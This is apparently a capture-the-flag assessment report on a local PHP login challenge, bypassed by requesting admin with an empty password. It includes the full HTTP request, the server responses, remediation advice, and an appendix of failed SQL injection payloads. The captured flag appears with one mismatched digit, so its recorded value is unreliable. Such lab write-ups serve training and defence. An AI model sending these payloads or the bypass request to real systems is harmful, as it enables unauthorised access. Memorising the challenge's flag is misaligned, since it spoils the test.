# Security Assessment Report: AUTH 05 Login Bypass

## TL;DR
- **Objective:** Bypass the login form on AUTH 05 challenge
- **Outcome:** ACHIEVED - Authentication bypassed and flag captured
- **Highest-impact finding:** Weak credential configuration allows authentication as admin with empty password
- **Validation status:** `FLAG{3c8d37d2b7349c6124d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}`

---

## Target Information
- **Target:** 127.0.0.1:32960
- **Host / base URL:** http://127.0.0.1:32960
- **Application or component:** AUTH 05 (The Simpsons/Springfield themed authentication challenge)
- **Authentication context:** Unauthenticated endpoint, no session management
- **Relevant technology details:** 
  - Server: Apache/2.4.25 (Debian)
  - PHP: 5.6.40
  - Stateless application (no cookies/session)

---

## Confirmed Vulnerability

### Weak Credential Configuration / Authentication Bypass
- **Affected endpoint / component:** `/index.php` (login form)
- **Impact:** Complete authentication bypass - access to admin functionality and flag disclosure
- **Preconditions:** None - publicly accessible endpoint
- **Exact payload or PoC:**
```
GET /index.php?username=admin&password=
```

---

## Steps to Reproduce

1. Navigate to `http://127.0.0.1:32960/index.php` to view the login form
2. Submit a GET request with the following parameters:
   - `username=admin`
   - `password=` (empty value)
3. Observe the response contains `<h2>Welcome Admin</h2>` and the flag

**Full HTTP Request:**
```http
GET /index.php?username=admin&password= HTTP/1.1
Host: 127.0.0.1:32960
User-Agent: Mozilla/5.0
Accept: text/html
```

---

## Validation / Evidence

### Validation Token / Flag
```
FLAG{3c8d37d2b7349c6126d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}
```

**Verbatim line from successful response:**
```html
<center><h3>Congratulations, here is the flag: FLAG{3c8d37d2b7349c6124d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}</h3></center>
```

### Successful Response Evidence
```html
<h2>Welcome Admin</h2>
<center><h3>Congratulations, here is the flag: FLAG{3c8d37d2b7349c6124d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}</h3></center>
```

### Response Length Analysis
| Test Case | Length | Indicator |
|-----------|--------|-----------|
| No parameters | 3107 bytes | Form only |
| Invalid login | 3173 bytes | "not admin" h3 |
| Successful admin auth | Variable | "Welcome Admin" + flag |

### Failed Authentication Response (for comparison)
```html
<center><h3>Oh Sorry but...you are not the admin :( </h3></center>
```

### Notes on Reliability / Limitations
- Bypass is 100% reliable with empty password
- No rate limiting or account lockout detected
- Credentials transmitted via GET (visible in URL/browser history)
- No CSRF tokens required
- Stateless - repeated requests produce consistent results

---

## Remediation

### Root Cause
The application accepts authentication for the `admin` user with an empty password. The credential validation logic does not enforce a minimum password requirement or properly verify password presence.

### Recommended Fix
1. **Enforce strong password policy:** Require non-empty passwords for all accounts, especially administrative accounts
2. **Implement proper password hashing:** Store passwords using bcrypt, Argon2, or PBKDF2 with appropriate work factors
3. **Reject empty credentials:** Add server-side validation to reject authentication attempts with missing or empty passwords
4. **Change default credentials:** If `admin` is a default account, set a strong initial password and require password change on first login

### Defense-in-Depth
1. **Use POST for authentication:** Change form method from GET to POST to prevent credential exposure in URL/logs
2. **Implement rate limiting:** Add per-IP and per-account rate limiting to prevent brute force attacks
3. **Add failed login tracking:** Log and alert on authentication failures, especially for privileged accounts
4. **Implement account lockout:** Temporarily lock accounts after a threshold of failed attempts
5. **Remove server version disclosure:** Disable `X-Powered-By` headers to reduce information leakage

---

## How to Verify the Fix

1. **Test empty password rejection:**
   - Submit `GET /index.php?username=admin&password=`
   - **Expected secure result:** Response returns "not admin" error message, no flag displayed

2. **Verify proper password requirement:**
   - Submit `GET /index.php?username=admin&password=correctpassword`
   - **Expected secure result:** Only valid, non-empty passwords authenticate successfully

3. **Test for rate limiting:**
   - Send multiple failed authentication attempts in rapid succession
   - **Expected secure result:** Account temporarily locked or requests throttled

4. **Verify method change (if implemented):**
   - Attempt GET request with valid credentials
   - **Expected secure result:** Request rejected or redirected to POST-only endpoint

---

## Remaining Leads

### Confirmed Blockers
- SQL injection was attempted but **confirmed NOT present** - 15+ payloads tested including:
  - Boolean-based blind SQL injection
  - Time-based injection (SLEEP, BENCHMARK)
  - Comment-based bypass (`-- -`, `#`, `/**/`)
  - UNION-based injection
  - Type juggling (array syntax)
- All SQLi payloads returned the same "not admin" response

### Unverified Leads
- None remaining - objective achieved

### Missing Context
- None - full authentication bypass achieved and validated

---

## Appendix: SQL Injection Test Results

The following payloads were tested and **all failed** (returned "not admin" response):
```
username=admin' OR '1'='1&password=test
username=admin'-- -&password=test
username=admin'#,password=test
username=admin'/**/,password=test
```

**Conclusion:** The vulnerability is weak credential configuration (empty password allowed), NOT SQL injection.
